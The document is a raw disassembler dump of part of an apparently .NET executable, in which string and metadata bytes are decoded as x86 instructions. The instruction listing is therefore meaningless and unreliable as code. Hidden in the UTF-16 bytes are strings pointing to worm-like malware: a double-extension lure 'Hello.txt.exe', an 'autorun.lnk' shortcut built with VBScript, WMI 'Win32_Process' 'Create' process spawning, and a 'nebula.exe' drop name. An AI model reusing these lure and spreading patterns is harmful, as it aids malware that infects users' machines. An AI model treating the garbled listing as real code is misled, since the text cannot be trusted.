  40a71e:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  40a722:	00 46 00             	add    %al,0x0(%esi)
  40a725:	47                   	inc    %edi
  40a726:	00 48 00             	add    %cl,0x0(%eax)
  40a729:	49                   	dec    %ecx
  40a72a:	00 4a 00             	add    %cl,0x0(%edx)
  40a72d:	4b                   	dec    %ebx
  40a72e:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  40a732:	00 4e 00             	add    %cl,0x0(%esi)
  40a735:	4f                   	dec    %edi
  40a736:	00 50 00             	add    %dl,0x0(%eax)
  40a739:	51                   	push   %ecx
  40a73a:	00 52 00             	add    %dl,0x0(%edx)
  40a73d:	53                   	push   %ebx
  40a73e:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  40a742:	00 56 00             	add    %dl,0x0(%esi)
  40a745:	57                   	push   %edi
  40a746:	00 58 00             	add    %bl,0x0(%eax)
  40a749:	59                   	pop    %ecx
  40a74a:	00 5a 00             	add    %bl,0x0(%edx)
  40a74d:	30 00                	xor    %al,(%eax)
  40a74f:	31 00                	xor    %eax,(%eax)
  40a751:	32 00                	xor    (%eax),%al
  40a753:	33 00                	xor    (%eax),%eax
  40a755:	34 00                	xor    $0x0,%al
  40a757:	35 00 36 00 37       	xor    $0x37003600,%eax
  40a75c:	00 38                	add    %bh,(%eax)
  40a75e:	00 39                	add    %bh,(%ecx)
  40a760:	00 00                	add    %al,(%eax)
  40a762:	1b 48 00             	sbb    0x0(%eax),%ecx
  40a765:	65 00 6c 00 6c       	add    %ch,%gs:0x6c(%eax,%eax,1)
  40a76a:	00 6f 00             	add    %ch,0x0(%edi)
  40a76d:	2e 00 74 00 78       	add    %dh,%cs:0x78(%eax,%eax,1)
  40a772:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  40a776:	00 65 00             	add    %ah,0x0(%ebp)
  40a779:	78 00                	js     0x40a77b
  40a77b:	65 00 00             	add    %al,%gs:(%eax)
  40a77e:	17                   	pop    %ss
  40a77f:	61                   	popa
  40a780:	00 75 00             	add    %dh,0x0(%ebp)
  40a783:	74 00                	je     0x40a785
  40a785:	6f                   	outsl  %ds:(%esi),(%dx)
  40a786:	00 72 00             	add    %dh,0x0(%edx)
  40a789:	75 00                	jne    0x40a78b
  40a78b:	6e                   	outsb  %ds:(%esi),(%dx)
  40a78c:	00 2e                	add    %ch,(%esi)
  40a78e:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40a792:	00 6b 00             	add    %ch,0x0(%ebx)
  40a795:	00 80 9d 22 00 0d    	add    %al,0xd00229d(%eax)
  40a79b:	00 0a                	add    %cl,(%edx)
  40a79d:	00 6f 00             	add    %ch,0x0(%edi)
  40a7a0:	4c                   	dec    %esp
  40a7a1:	00 69 00             	add    %ch,0x0(%ecx)
  40a7a4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7a5:	00 6b 00             	add    %ch,0x0(%ebx)
  40a7a8:	2e 00 57 00          	add    %dl,%cs:0x0(%edi)
  40a7ac:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40a7b2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7b3:	00 77 00             	add    %dh,0x0(%edi)
  40a7b6:	53                   	push   %ebx
  40a7b7:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40a7bb:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40a7bf:	00 20                	add    %ah,(%eax)
  40a7c1:	00 3d 00 20 00 31    	add    %bh,0x31002000
  40a7c7:	00 0d 00 0a 00 6f    	add    %cl,0x6f000a00
  40a7cd:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a7d1:	00 6e 00             	add    %ch,0x0(%esi)
  40a7d4:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  40a7d7:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  40a7db:	00 73 00             	add    %dh,0x0(%ebx)
  40a7de:	63 00                	arpl   %eax,(%eax)
  40a7e0:	72 00                	jb     0x40a7e2
  40a7e2:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40a7e8:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a7ee:	20 00                	and    %al,(%eax)
  40a7f0:	3d 00 20 00 22       	cmp    $0x22002000,%eax
  40a7f5:	00 57 00             	add    %dl,0x0(%edi)
  40a7f8:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40a7fe:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7ff:	00 77 00             	add    %dh,0x0(%edi)
  40a802:	73 00                	jae    0x40a804
  40a804:	20 00                	and    %al,(%eax)
  40a806:	53                   	push   %ebx
  40a807:	00 68 00             	add    %ch,0x0(%eax)
  40a80a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a80b:	00 72 00             	add    %dh,0x0(%edx)
  40a80e:	74 00                	je     0x40a810
  40a810:	63 00                	arpl   %eax,(%eax)
  40a812:	75 00                	jne    0x40a814
  40a814:	74 00                	je     0x40a816
  40a816:	22 00                	and    (%eax),%al
  40a818:	0d 00 0a 00 6f       	or     $0x6f000a00,%eax
  40a81d:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a821:	00 6e 00             	add    %ch,0x0(%esi)
  40a824:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  40a827:	00 53 00             	add    %dl,0x0(%ebx)
  40a82a:	61                   	popa
  40a82b:	00 76 00             	add    %dh,0x0(%esi)
  40a82e:	65 00 0d 00 0a 00 00 	add    %cl,%gs:0xa00
  40a835:	09 74 00 65          	or     %esi,0x65(%eax,%eax,1)
  40a839:	00 6d 00             	add    %ch,0x0(%ebp)
  40a83c:	70 00                	jo     0x40a83e
  40a83e:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40a844:	00 17                	add    %dl,(%edi)
  40a846:	5c                   	pop    %esp
  40a847:	00 72 00             	add    %dh,0x0(%edx)
  40a84a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a84b:	00 6f 00             	add    %ch,0x0(%edi)
  40a84e:	74 00                	je     0x40a850
  40a850:	5c                   	pop    %esp
  40a851:	00 63 00             	add    %ah,0x0(%ebx)
  40a854:	69 00 6d 00 76 00    	imul   $0x76006d,(%eax),%eax
  40a85a:	32 00                	xor    (%eax),%al
  40a85c:	00 1b                	add    %bl,(%ebx)
  40a85e:	57                   	push   %edi
  40a85f:	00 69 00             	add    %ch,0x0(%ecx)
  40a862:	6e                   	outsb  %ds:(%esi),(%dx)
  40a863:	00 33                	add    %dh,(%ebx)
  40a865:	00 32                	add    %dh,(%edx)
  40a867:	00 5f 00             	add    %bl,0x0(%edi)
  40a86a:	50                   	push   %eax
  40a86b:	00 72 00             	add    %dh,0x0(%edx)
  40a86e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a86f:	00 63 00             	add    %ah,0x0(%ebx)
  40a872:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a876:	73 00                	jae    0x40a878
  40a878:	00 0d 43 00 72 00    	add    %cl,0x720043
  40a87e:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a882:	74 00                	je     0x40a884
  40a884:	65 00 00             	add    %al,%gs:(%eax)
  40a887:	17                   	pop    %ss
  40a888:	43                   	inc    %ebx
  40a889:	00 6f 00             	add    %ch,0x0(%edi)
  40a88c:	6d                   	insl   (%dx),%es:(%edi)
  40a88d:	00 6d 00             	add    %ch,0x0(%ebp)
  40a890:	61                   	popa
  40a891:	00 6e 00             	add    %ch,0x0(%esi)
  40a894:	64 00 4c 00 69       	add    %cl,%fs:0x69(%eax,%eax,1)
  40a899:	00 6e 00             	add    %ch,0x0(%esi)
  40a89c:	65 00 00             	add    %al,%gs:(%eax)
  40a89f:	0f 7b                	(bad)
  40a8a1:	00 30                	add    %dh,(%eax)
  40a8a3:	00 7d 00             	add    %bh,0x0(%ebp)
  40a8a6:	2e 00 7b 00          	add    %bh,%cs:0x0(%ebx)
  40a8aa:	31 00                	xor    %eax,(%eax)
  40a8ac:	7d 00                	jge    0x40a8ae
  40a8ae:	00 0f                	add    %cl,(%edi)
  40a8b0:	38 00                	cmp    %al,(%eax)
  40a8b2:	2e 00 38             	add    %bh,%cs:(%eax)
  40a8b5:	00 2e                	add    %ch,(%esi)
  40a8b7:	00 38                	add    %bh,(%eax)
  40a8b9:	00 2e                	add    %ch,(%esi)
  40a8bb:	00 38                	add    %bh,(%eax)
  40a8bd:	00 00                	add    %al,(%eax)
  40a8bf:	03 5c 00 00          	add    0x0(%eax,%eax,1),%ebx
  40a8c3:	17                   	pop    %ss
  40a8c4:	5c                   	pop    %esp
  40a8c5:	00 6e 00             	add    %ch,0x0(%esi)
  40a8c8:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40a8cc:	75 00                	jne    0x40a8ce
  40a8ce:	6c                   	insb   (%dx),%es:(%edi)
  40a8cf:	00 61 00             	add    %ah,0x0(%ecx)
  40a8d2:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40a8d6:	78 00                	js     0x40a8d8
  40a8d8:	65 00 00             	add    %al,%gs:(%eax)
  40a8db:	00 ff                	add    %bh,%bh
  40a8dd:	57                   	push   %edi
  40a8de:	9a ec fb 1a 14 40 80 	lcall  $0x8040,$0x141afbec
  40a8e5:	cb                   	lret
  40a8e6:	b3 77                	mov    $0x77,%bl
  40a8e8:	97                   	xchg   %eax,%edi
  40a8e9:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40a8ea:	ad                   	lods   %ds:(%esi),%eax
  40a8eb:	07                   	pop    %es
  40a8ec:	00 04 20             	add    %al,(%eax,%eiz,1)
  40a8ef:	01 01                	add    %eax,(%ecx)
  40a8f1:	08 03                	or     %al,(%ebx)
  40a8f3:	20 00                	and    %al,(%eax)
  40a8f5:	01 05 20 01 01 11    	add    %eax,0x11010120
  40a8fb:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  40a8fe:	01 01                	add    %eax,(%ecx)
  40a900:	0e                   	push   %cs
  40a901:	04 20                	add    $0x20,%al
  40a903:	01 01                	add    %eax,(%ecx)
  40a905:	02 05 20 01 01 11    	add    0x11010120,%al
  40a90b:	41                   	inc    %ecx
  40a90c:	06                   	push   %es
  40a90d:	20 01                	and    %al,(%ecx)
  40a90f:	01 12                	add    %edx,(%edx)
  40a911:	80 95 06 20 01 01 12 	adcb   $0x12,0x1012006(%ebp)
  40a918:	80 e5 03             	and    $0x3,%ch
  40a91b:	06                   	push   %es
  40a91c:	12 51 05             	adc    0x5(%ecx),%dl
  40a91f:	20 01                	and    %al,(%ecx)
  40a921:	12 51 0e             	adc    0xe(%ecx),%dl
  40a924:	08 20                	or     %ah,(%eax)
  40a926:	03 01                	add    (%ecx),%eax
  40a928:	0e                   	push   %cs
  40a929:	1c 11                	sbb    $0x11,%al
  40a92b:	81 21 07 00 01 12    	andl   $0x12010007,(%ecx)
  40a931:	65 12 81 25 06 07 03 	adc    %gs:0x3070625(%ecx),%al
  40a938:	18 09                	sbb    %cl,(%ecx)
  40a93a:	1d 05 04 00 01       	sbb    $0x1000405,%eax
  40a93f:	19 0b                	sbb    %ecx,(%ebx)
  40a941:	09 00                	or     %eax,(%eax)
  40a943:	02 01                	add    (%ecx),%al
  40a945:	12 81 35 11 81 39    	adc    0x39811135(%ecx),%al
  40a94b:	08 00                	or     %al,(%eax)
  40a94d:	04 01                	add    $0x1,%al
  40a94f:	1d 05 08 18 08       	sbb    $0x8180805,%eax
  40a954:	04 00                	add    $0x0,%al
  40a956:	01 02                	add    %eax,(%edx)
  40a958:	0e                   	push   %cs
  40a959:	0e                   	push   %cs
  40a95a:	07                   	pop    %es
  40a95b:	09 0e                	or     %ecx,(%esi)
  40a95d:	0e                   	push   %cs
  40a95e:	12 51 1d             	adc    0x1d(%ecx),%dl
  40a961:	0e                   	push   %cs
  40a962:	08 0e                	or     %cl,(%esi)
  40a964:	0e                   	push   %cs
  40a965:	1d 0e 08 06 00       	sbb    $0x6080e,%eax
  40a96a:	02 12                	add    (%edx),%dl
  40a96c:	65 0e                	gs push %cs
  40a96e:	0e                   	push   %cs
  40a96f:	06                   	push   %es
  40a970:	20 02                	and    %al,(%edx)
  40a972:	12 51 0e             	adc    0xe(%ecx),%dl
  40a975:	02 04 20             	add    (%eax,%eiz,1),%al
  40a978:	00 1d 0e 05 20 02    	add    %bl,0x220050e
  40a97e:	01 0e                	add    %ecx,(%esi)
  40a980:	02 06                	add    (%esi),%al
  40a982:	00 01                	add    %al,(%ecx)
  40a984:	0e                   	push   %cs
  40a985:	11 81 49 05 00 02    	adc    %eax,0x2000549(%ecx)
  40a98b:	0e                   	push   %cs
  40a98c:	0e                   	push   %cs
  40a98d:	0e                   	push   %cs
  40a98e:	05 00 02 01 0e       	add    $0xe010200,%eax
  40a993:	02 04 00             	add    (%eax,%eax,1),%al
  40a996:	00 1d 0e 09 00 03    	add    %bl,0x300090e
  40a99c:	1d 0e 0e 0e 11       	sbb    $0x110e0e0e,%eax
  40a9a1:	81 55 04 00 01 01 0e 	adcl   $0xe010100,0x4(%ebp)
  40a9a8:	04 00                	add    $0x0,%al
  40a9aa:	00 12                	add    %dl,(%edx)
  40a9ac:	65 05 20 00 12 81    	gs add $0x81120020,%eax
  40a9b2:	59                   	pop    %ecx
  40a9b3:	03 20                	add    (%eax),%esp
  40a9b5:	00 0e                	add    %cl,(%esi)
  40a9b7:	06                   	push   %es
  40a9b8:	00 03                	add    %al,(%ebx)
  40a9ba:	0e                   	push   %cs
  40a9bb:	0e                   	push   %cs
  40a9bc:	0e                   	push   %cs
  40a9bd:	0e                   	push   %cs
  40a9be:	05 20 02 01 1c       	add    $0x1c010220,%eax
  40a9c3:	18 05 20 01 01 12    	sbb    %al,0x12010120
  40a9c9:	5d                   	pop    %ebp
  40a9ca:	0a 07                	or     (%edi),%al
  40a9cc:	05 12 64 08 11       	add    $0x11086412,%eax
  40a9d1:	59                   	pop    %ecx
  40a9d2:	08 12                	or     %dl,(%edx)
  40a9d4:	5d                   	pop    %ebp
  40a9d5:	05 20 02 08 08       	add    $0x8080220,%eax
  40a9da:	08 04 00             	or     %al,(%eax,%eax,1)
  40a9dd:	01 01                	add    %eax,(%ecx)
  40a9df:	08 04 00             	or     %al,(%eax,%eax,1)
  40a9e2:	00 11                	add    %dl,(%ecx)
  40a9e4:	59                   	pop    %ecx
  40a9e5:	05 20 01 11 59       	add    $0x59110120,%eax
  40a9ea:	0d 03 00 00 08       	or     $0x8000003,%eax
  40a9ef:	07                   	pop    %es
  40a9f0:	00 02                	add    %al,(%edx)
  40a9f2:	02 11                	add    (%ecx),%dl
  40a9f4:	59                   	pop    %ecx
  40a9f5:	11 59 05             	adc    %ebx,0x5(%ecx)
  40a9f8:	07                   	pop    %es
  40a9f9:	02 1d 05 08 03 20    	add    0x20030805,%bl
  40a9ff:	00 08                	add    %cl,(%eax)
  40aa01:	05 20 02 0e 08       	add    $0x80e0220,%eax
  40aa06:	08 05 00 02 05 0e    	or     %al,0xe050200
  40aa0c:	08 09                	or     %cl,(%ecx)
  40aa0e:	07                   	pop    %es
  40aa0f:	06                   	push   %es
  40aa10:	12 65 18             	adc    0x18(%ebp),%ah
  40aa13:	18 18                	sbb    %bl,(%eax)
  40aa15:	02 18                	add    (%eax),%bl
  40aa17:	05 00 01 12 65       	add    $0x65120100,%eax
  40aa1c:	0e                   	push   %cs
  40aa1d:	03 20                	add    (%eax),%esp
  40aa1f:	00 02                	add    %al,(%edx)
  40aa21:	02 06                	add    (%esi),%al
  40aa23:	18 05 00 02 02 18    	sbb    %al,0x18020200
  40aa29:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40aa2c:	01 1d 05 06 07 03    	add    %ebx,0x3070605
  40aa32:	1d 05 18 09 03       	sbb    $0x3091805,%eax
  40aa37:	00 00                	add    %al,(%eax)
  40aa39:	0e                   	push   %cs
  40aa3a:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40aa3f:	0e                   	push   %cs
  40aa40:	07                   	pop    %es
  40aa41:	07                   	pop    %es
  40aa42:	03 0e                	add    (%esi),%ecx
  40aa44:	12 6d 12             	adc    0x12(%ebp),%ch
  40aa47:	6d                   	insl   (%dx),%es:(%edi)
  40aa48:	0c 20                	or     $0x20,%al
  40aa4a:	03 01                	add    (%ecx),%eax
  40aa4c:	12 80 d5 12 81 71    	adc    0x718112d5(%eax),%al
  40aa52:	12 81 75 04 20 00    	adc    0x200475(%ecx),%al
  40aa58:	12 6d 05             	adc    0x5(%ebp),%ch
  40aa5b:	20 02                	and    %al,(%edx)
  40aa5d:	01 0e                	add    %ecx,(%esi)
  40aa5f:	1c 05                	sbb    $0x5,%al
  40aa61:	20 00                	and    %al,(%eax)
  40aa63:	12 81 71 03 07 01    	adc    0x1070371(%ecx),%al
  40aa69:	02 05 20 00 12 81    	add    0x81120020,%al
  40aa6f:	79 08                	jns    0x40aa79
  40aa71:	07                   	pop    %es
  40aa72:	04 12                	add    $0x12,%al
  40aa74:	75 0e                	jne    0x40aa84
  40aa76:	0e                   	push   %cs
  40aa77:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40aa7c:	12 81 7d 04 20 00    	adc    0x20047d(%ecx),%al
  40aa82:	12 75 05             	adc    0x5(%ebp),%dh
  40aa85:	20 00                	and    %al,(%eax)
  40aa87:	12 81 81 05 20 00    	adc    0x200581(%ecx),%al
  40aa8d:	12 81 85 04 20 01    	adc    0x1200485(%ecx),%al
  40aa93:	0e                   	push   %cs
  40aa94:	0e                   	push   %cs
  40aa95:	05 00 00 12 81       	add    $0x81120000,%eax
  40aa9a:	89 05 20 01 1d 05    	mov    %eax,0x51d0120
  40aaa0:	0e                   	push   %cs
  40aaa1:	05 20 00 12 81       	add    $0x81120020,%eax
  40aaa6:	8d 07                	lea    (%edi),%eax
  40aaa8:	20 03                	and    %al,(%ebx)
  40aaaa:	01 1d 05 08 08 06    	add    %ebx,0x6080805
  40aab0:	07                   	pop    %es
  40aab1:	03 0e                	add    (%esi),%ecx
  40aab3:	0e                   	push   %cs
  40aab4:	12 69 05             	adc    0x5(%ecx),%ch
  40aab7:	20 00                	and    %al,(%eax)
  40aab9:	12 81 25 05 20 00    	adc    0x200525(%ecx),%al
  40aabf:	12 80 b5 06 07 03    	adc    0x30706b5(%eax),%al
  40aac5:	0e                   	push   %cs
  40aac6:	0e                   	push   %cs
  40aac7:	12 51 06             	adc    0x6(%ecx),%dl
  40aaca:	20 01                	and    %al,(%ecx)
  40aacc:	01 11                	add    %edx,(%ecx)
  40aace:	81 99 03 00 00 02 0b 	sbbl   $0x1d05070b,0x2000003(%ecx)
  40aad5:	07 05 1d 
  40aad8:	12 65 08             	adc    0x8(%ebp),%ah
  40aadb:	12 65 12             	adc    0x12(%ebp),%ah
  40aade:	6c                   	insb   (%dx),%es:(%edi)
  40aadf:	02 05 00 00 1d 12    	add    0x121d0000,%al
  40aae5:	65 07                	gs pop %es
  40aae7:	15 12 81 a1 02       	adc    $0x2a18112,%eax
  40aaec:	0e                   	push   %cs
  40aaed:	02 13                	add    (%ebx),%dl
  40aaef:	10 01                	adc    %al,(%ecx)
  40aaf1:	02 02                	add    (%edx),%al
  40aaf3:	15 12 81 a9 01       	adc    $0x1a98112,%eax
  40aaf8:	1e                   	push   %ds
  40aaf9:	00 15 12 81 a1 02    	add    %dl,0x2a18112
  40aaff:	1e                   	push   %ds
  40ab00:	00 02                	add    %al,(%edx)
  40ab02:	03 0a                	add    (%edx),%ecx
  40ab04:	01 0e                	add    %ecx,(%esi)
  40ab06:	0b 07                	or     (%edi),%eax
  40ab08:	05 1d 12 65 08       	add    $0x865121d,%eax
  40ab0d:	12 65 12             	adc    0x12(%ebp),%ah
  40ab10:	70 02                	jo     0x40ab14
  40ab12:	0d 07 05 12 79       	or     $0x79120507,%eax
  40ab17:	12 80 81 12 80 85    	adc    -0x7a7fed7f(%eax),%al
  40ab1d:	12 74 02 04          	adc    0x4(%edx,%eax,1),%dh
  40ab21:	20 00                	and    %al,(%eax)
  40ab23:	12 7d 05             	adc    0x5(%ebp),%bh
  40ab26:	20 00                	and    %al,(%eax)
  40ab28:	12 80 81 05 20 00    	adc    0x200581(%eax),%al
  40ab2e:	12 80 85 04 20 01    	adc    0x1200485(%eax),%al
  40ab34:	1c 0e                	sbb    $0xe,%al
  40ab36:	06                   	push   %es
  40ab37:	07                   	pop    %es
  40ab38:	03 12                	add    (%edx),%edx
  40ab3a:	51                   	push   %ecx
  40ab3b:	1c 02                	sbb    $0x2,%al
  40ab3d:	05 00 00 12 81       	add    $0x81120000,%eax
  40ab42:	ad                   	lods   %ds:(%esi),%eax
  40ab43:	03 20                	add    (%eax),%esp
  40ab45:	00 0a                	add    %cl,(%edx)
  40ab47:	0d 07 05 1d 12       	or     $0x121d0507,%eax
  40ab4c:	80 89 08 12 80 89 12 	orb    $0x12,-0x767fedf8(%ecx)
  40ab53:	68 02 06 00 00       	push   $0x602
  40ab58:	1d 12 80 89 05       	sbb    $0x5898012,%eax
  40ab5d:	20 00                	and    %al,(%eax)
  40ab5f:	12 81 b1 0a 00 02    	adc    0x2000ab1(%ecx),%al
  40ab65:	15 12 81 a9 01       	adc    $0x1a98112,%eax
  40ab6a:	08 08                	or     %cl,(%eax)
  40ab6c:	08 07                	or     %al,(%edi)
  40ab6e:	15 12 81 a1 02       	adc    $0x2a18112,%eax
  40ab73:	08 0e                	or     %cl,(%esi)
  40ab75:	1a 10                	sbb    (%eax),%dl
  40ab77:	02 02                	add    (%edx),%al
  40ab79:	15 12 81 a9 01       	adc    $0x1a98112,%eax
  40ab7e:	1e                   	push   %ds
  40ab7f:	01 15 12 81 a9 01    	add    %edx,0x1a98112
  40ab85:	1e                   	push   %ds
  40ab86:	00 15 12 81 a1 02    	add    %dl,0x2a18112
  40ab8c:	1e                   	push   %ds
  40ab8d:	00 1e                	add    %bl,(%esi)
  40ab8f:	01 04 0a             	add    %eax,(%edx,%ecx,1)
  40ab92:	02 08                	add    (%eax),%cl
  40ab94:	0e                   	push   %cs
  40ab95:	0a 00                	or     (%eax),%al
  40ab97:	02 0e                	add    (%esi),%cl
  40ab99:	0e                   	push   %cs
  40ab9a:	15 12 81 a9 01       	adc    $0x1a98112,%eax
  40ab9f:	0e                   	push   %cs
  40aba0:	0a 07                	or     (%edi),%al
  40aba2:	05 12 79 12 80       	add    $0x80127912,%eax
  40aba7:	81 0e 0e 02 04 20    	orl    $0x2004020e,(%esi)
  40abad:	01 02                	add    %eax,(%edx)
  40abaf:	0e                   	push   %cs
  40abb0:	0a 07                	or     (%edi),%al
  40abb2:	04 12                	add    $0x12,%al
  40abb4:	79 12                	jns    0x40abc8
  40abb6:	80 81 02 12 79 04 00 	addb   $0x0,0x4791202(%ecx)
  40abbd:	01 0b                	add    %ecx,(%ebx)
  40abbf:	1c 09                	sbb    $0x9,%al
  40abc1:	07                   	pop    %es
  40abc2:	06                   	push   %es
  40abc3:	0e                   	push   %cs
  40abc4:	0e                   	push   %cs
  40abc5:	1d 0e 08 0e 0e       	sbb    $0xe0e080e,%eax
  40abca:	03 07                	add    (%edi),%eax
  40abcc:	01 0e                	add    %ecx,(%esi)
  40abce:	08 07                	or     %al,(%edi)
  40abd0:	04 0e                	add    $0xe,%al
  40abd2:	0e                   	push   %cs
  40abd3:	0e                   	push   %cs
  40abd4:	11 80 8d 04 00 01    	adc    %eax,0x100048d(%eax)
  40abda:	0e                   	push   %cs
  40abdb:	0e                   	push   %cs
  40abdc:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40abe1:	0e                   	push   %cs
  40abe2:	05 00 00 11 80       	add    $0x80110000,%eax
  40abe7:	8d 05 00 02 01 0e    	lea    0xe010200,%eax
  40abed:	0e                   	push   %cs
  40abee:	05 07 01 11 80       	add    $0x80110107,%eax
  40abf3:	88 05 00 00 11 80    	mov    %al,0x80110000
  40abf9:	ed                   	in     (%dx),%eax
  40abfa:	07                   	pop    %es
  40abfb:	30 01                	xor    %al,(%ecx)
  40abfd:	01 01                	add    %eax,(%ecx)
  40abff:	10 1e                	adc    %bl,(%esi)
  40ac01:	00 05 0a 01 11 80    	add    %al,0x8011010a
  40ac07:	88 05 20 00 12 80    	mov    %al,0x80120020
  40ac0d:	9d                   	popf
  40ac0e:	08 07                	or     %al,(%edi)
  40ac10:	03 12                	add    (%edx),%edx
  40ac12:	80 a1 1d 05 02 0c 20 	andb   $0x20,0xc02051d(%ecx)
  40ac19:	03 01                	add    (%ecx),%eax
  40ac1b:	11 81 b9 11 81 bd    	adc    %eax,-0x427eee47(%ecx)
  40ac21:	11 81 c1 05 20 02    	adc    %eax,0x22005c1(%ecx)
  40ac27:	01 0e                	add    %ecx,(%esi)
  40ac29:	08 05 20 01 08 1d    	or     %al,0x1d080120
  40ac2f:	05 13 07 07 12       	add    $0x12070713,%eax
  40ac34:	80 a9 12 80 ad 12 80 	subb   $0x80,0x12ad8012(%ecx)
  40ac3b:	b1 12                	mov    $0x12,%cl
  40ac3d:	80 b5 12 80 b9 0e 0e 	xorb   $0xe,0xeb98012(%ebp)
  40ac44:	04 06                	add    $0x6,%al
  40ac46:	12 80 bd 07 20 02    	adc    0x22007bd(%eax),%al
  40ac4c:	01 12                	add    %edx,(%edx)
  40ac4e:	80 bd 08 05 20 00 12 	cmpb   $0x12,0x200508(%ebp)
  40ac55:	80 ad 05 20 00 12 80 	subb   $0x80,0x12002005(%ebp)
  40ac5c:	b1 09                	mov    $0x9,%cl
  40ac5e:	20 02                	and    %al,(%edx)
  40ac60:	01 12                	add    %edx,(%edx)
  40ac62:	81 8d 12 81 89 09 07 	orl    $0x65120507,0x9898112(%ebp)
  40ac69:	05 12 65 
  40ac6c:	0e                   	push   %cs
  40ac6d:	0e                   	push   %cs
  40ac6e:	0e                   	push   %cs
  40ac6f:	12 69 05             	adc    0x5(%ecx),%ch
  40ac72:	20 02                	and    %al,(%edx)
  40ac74:	01 0e                	add    %ecx,(%esi)
  40ac76:	0e                   	push   %cs
  40ac77:	0d 07 05 1d 12       	or     $0x121d0507,%eax
  40ac7c:	80 bd 08 12 80 bd 1d 	cmpb   $0x1d,-0x427fedf8(%ebp)
  40ac83:	0e                   	push   %cs
  40ac84:	0e                   	push   %cs
  40ac85:	06                   	push   %es
  40ac86:	00 01                	add    %al,(%ecx)
  40ac88:	12 81 cd 0e 06 20    	adc    0x20060ecd(%ecx),%al
  40ac8e:	00 1d 12 80 bd 05    	add    %bl,0x5bd8012
  40ac94:	20 00                	and    %al,(%eax)
  40ac96:	11 81 b9 06 20 01    	adc    %eax,0x12006b9(%ecx)
  40ac9c:	1d 0e 1d 03 09       	sbb    $0x9031d0e,%eax
  40aca1:	07                   	pop    %es
  40aca2:	03 12                	add    (%edx),%edx
  40aca4:	80 c1 12             	add    $0x12,%cl
  40aca7:	80 c5 02             	add    $0x2,%ch
  40acaa:	07                   	pop    %es
  40acab:	20 02                	and    %al,(%edx)
  40acad:	12 80 c5 0e 08 05    	adc    0x5080ec5(%eax),%al
  40acb3:	20 00                	and    %al,(%eax)
  40acb5:	11 81 d5 06 07 02    	adc    %eax,0x20706d5(%ecx)
  40acbb:	12 80 ad 02 07 20    	adc    0x200702ad(%eax),%al
  40acc1:	02 12                	add    (%edx),%dl
  40acc3:	80 9d 0e 08 04 20 01 	sbbb   $0x1,0x2004080e(%ebp)
  40acca:	02 08                	add    (%eax),%cl
  40accc:	08 07                	or     %al,(%edi)
  40acce:	03 11                	add    (%ecx),%edx
  40acd0:	59                   	pop    %ecx
  40acd1:	02 11                	add    (%ecx),%dl
  40acd3:	80 c9 05             	or     $0x5,%cl
  40acd6:	00 01                	add    %al,(%ecx)
  40acd8:	11 59 0e             	adc    %ebx,0xe(%ecx)
  40acdb:	09 00                	or     %eax,(%eax)
  40acdd:	02 11                	add    (%ecx),%dl
  40acdf:	80 c9 11             	or     $0x11,%cl
  40ace2:	59                   	pop    %ecx
  40ace3:	11 59 03             	adc    %ebx,0x3(%ecx)
  40ace6:	20 00                	and    %al,(%eax)
  40ace8:	0d 05 07 01 11       	or     $0x11010705,%eax
  40aced:	80 8c 05 0a 01 11 80 	orb    $0x8c,-0x7feefef6(%ebp,%eax,1)
  40acf4:	8c 
  40acf5:	06                   	push   %es
  40acf6:	07                   	pop    %es
  40acf7:	03 08                	add    (%eax),%ecx
  40acf9:	1d 03 08 04 20       	sbb    $0x20040803,%eax
  40acfe:	01 08                	add    %ecx,(%eax)
  40ad00:	08 04 20             	or     %al,(%eax,%eiz,1)
  40ad03:	01 03                	add    %eax,(%ebx)
  40ad05:	08 05 20 01 01 1d    	or     %al,0x1d010120
  40ad0b:	03 02                	add    (%edx),%eax
  40ad0d:	06                   	push   %es
  40ad0e:	0e                   	push   %cs
  40ad0f:	07                   	pop    %es
  40ad10:	00 02                	add    %al,(%edx)
  40ad12:	01 0e                	add    %ecx,(%esi)
  40ad14:	11 81 d9 04 07 01    	adc    %eax,0x10704d9(%ecx)
  40ad1a:	12 51 04             	adc    0x4(%ecx),%dl
  40ad1d:	07                   	pop    %es
  40ad1e:	02 0e                	add    (%esi),%cl
  40ad20:	0e                   	push   %cs
  40ad21:	0a 07                	or     (%edi),%al
  40ad23:	06                   	push   %es
  40ad24:	0e                   	push   %cs
  40ad25:	1d 0e 08 1d 0e       	sbb    $0xe1d080e,%eax
  40ad2a:	08 0e                	or     %cl,(%esi)
  40ad2c:	06                   	push   %es
  40ad2d:	00 02                	add    %al,(%edx)
  40ad2f:	1d 0e 0e 0e 07       	sbb    $0x70e0e0e,%eax
  40ad34:	20 02                	and    %al,(%edx)
  40ad36:	02 0e                	add    (%esi),%cl
